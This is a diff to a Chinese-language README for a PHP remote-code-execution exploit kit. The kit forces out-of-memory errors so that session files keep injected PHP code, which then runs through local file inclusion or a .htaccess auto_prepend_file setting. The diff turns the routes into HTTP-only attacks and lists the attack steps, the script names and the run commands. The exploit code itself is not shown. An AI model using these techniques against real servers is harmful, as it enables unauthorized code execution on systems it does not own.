@@ -98,9 +98,17 @@ session.use_only_cookies = 1  ; 預設只接受 cookie 傳遞 PHPSESSID
 session.use_strict_mode = 0   ; 預設接受任意 session ID
 ```
 
-## 攻擊流程
+## 腳本說明
 
-### 方式一：OOM + LFI（純 HTTP，無需 SSH）
+| 腳本 | 路線 | 前置條件 | 說明 |
+|------|------|----------|------|
+| `exploit_lfi.py` | OOM + LFI | 目標存在 LFI 漏洞 | 純 HTTP，不需任何主機存取 |
+| `http_rce.py` | OOM + auto_prepend | `.htaccess` 已放置，`post_max_size ≥ memory_limit` | 純 HTTP，`.htaccess` 設定 `auto_prepend_file` 指向 session 檔 |
+| `http_rce_default.py` | OOM + auto_prepend | `.htaccess` 已放置，Apache AllowOverride All | 純 HTTP，`.htaccess` 同時覆蓋 `memory_limit` + `post_max_size` + `auto_prepend_file` |
+| `test_oom.py` | 僅 OOM 測試 | `post_max_size ≥ memory_limit` | 只驗證 OOM 是否觸發，不嘗試 RCE |
+| `exploit.py` | GDB 記憶體劫持 | SSH + GDB + debug symbols | 單漏洞路線，詳見 [gdb-exploit.md](gdb-exploit.md) |
+
+### 方式一：OOM + LFI（純 HTTP）
 
 適用於目標存在 Local File Inclusion 漏洞的環境。
 
@@ -109,30 +117,29 @@ session.use_strict_mode = 0   ; 預設接受任意 session ID
 2. GET /vuln.php?file=/var/lib/php/session/sess_<SID> → include → RCE
 ```
 
-**腳本**：`exploit_lfi.py`
-
 ```bash
 TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 exploit_lfi.py
 ```
 
-### 方式二：OOM + .htaccess auto_prepend_file（需 SSH）
+### 方式二：OOM + .htaccess auto_prepend_file（純 HTTP）
 
-適用於有 SSH 存取且 Apache 設定 AllowOverride All 的環境。
+適用於目標 web root 已有 `.htaccess`（管理員設定、檔案上傳漏洞、或其他寫入方式）
+且 Apache 設定 AllowOverride All 的環境。
 
 ```
-1. SSH 建立 .htaccess（設定 auto_prepend_file 指向 session 檔案）
+1. .htaccess 設定 auto_prepend_file 指向 session 檔案（事先放置）
 2. POST multipart → OOM → session 檔案保留（含 PHP code）
 3. GET /any.php → Apache 自動 prepend session 檔案 → RCE
 ```
 
-**腳本**：
-- `http_rce.py` — 目標已調整過 php.ini（post_max_size > memory_limit）
-- `http_rce_default.py` — 目標為 stock php.ini，用 .htaccess 同時覆蓋
-  memory_limit 和 post_max_size
-
+目標 php.ini 已調整過（`post_max_size > memory_limit`）：
 ```bash
-TARGET_HOST=10.0.0.1 SSH_USER=admin SSH_PASS=secret python3 http_rce.py
-TARGET_HOST=10.0.0.1 SSH_USER=admin SSH_PASS=secret python3 http_rce_default.py
+TARGET_HOST=10.0.0.1 python3 http_rce.py
+```
+
+目標為 stock php.ini（`.htaccess` 同時覆蓋 memory_limit 和 post_max_size）：
+```bash
+TARGET_HOST=10.0.0.1 python3 http_rce_default.py
 ```
 
 ### OOM 獨立測試
@@ -151,8 +158,8 @@ TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 test_oom.py
 |------|--------|------|
 | `TARGET_HOST` | `127.0.0.1` | 目標 IP 或主機名稱 |
 | `TARGET_PORT` | `80` 或 `443` | HTTP/HTTPS port |
-| `SSH_USER` | `user` | SSH 使用者（需 sudo 權限） |
-| `SSH_PASS` | `pass` | SSH 密碼 |
+| `SESSION_PATH` | `/var/lib/php/sessions` | Session 檔案目錄 |
+| `CMD` | `id` | 要執行的指令 |
 
 ## Session 檔案路徑
 
@@ -171,10 +178,10 @@ TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 test_oom.py
 ## 檔案結構
 
 ```
-├── exploit_lfi.py           ← 純 HTTP RCE（OOM + LFI，無需 SSH）
-├── http_rce.py              ← HTTP RCE + SSH（lab-tuned php.ini）
-├── http_rce_default.py      ← HTTP RCE + SSH（stock php.ini，.htaccess override）
-├── test_oom.py          ← 獨立 OOM 觸發測試
+├── exploit_lfi.py           ← 純 HTTP RCE（OOM + LFI）
+├── http_rce.py              ← 純 HTTP RCE（OOM + auto_prepend_file）
+├── http_rce_default.py      ← 純 HTTP RCE（stock php.ini + .htaccess override）
+├── test_oom.py              ← 獨立 OOM 觸發測試
 ├── exploit.py               ← GDB 輔助單漏洞 RCE（詳見 gdb-exploit.md）
 ├── README.md                ← 本文件（HTTP 雙漏洞路線）
 ├── gdb-exploit.md           ← GDB 單漏洞路線：記憶體位址解析與 payload 佈局
@@ -183,7 +190,7 @@ TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 test_oom.py
 ## 限制
 
 - **LFI 版本** (`exploit_lfi.py`)：需要目標存在 LFI 向量
-- **.htaccess 版本** (`http_rce.py`, `http_rce_default.py`)：需要 SSH + Apache AllowOverride All
+- **.htaccess 版本** (`http_rce.py`, `http_rce_default.py`)：需要 `.htaccess` 已在 web root（任何寫入方式皆可）
 - **PHP 預設設定下無法單獨觸發 OOM**：需要 `post_max_size ≥ memory_limit`
 - **GDB 版本** (`exploit.py`)：需要 SSH + sudo + debug symbols，詳見 [gdb-exploit.md](gdb-exploit.md)
 
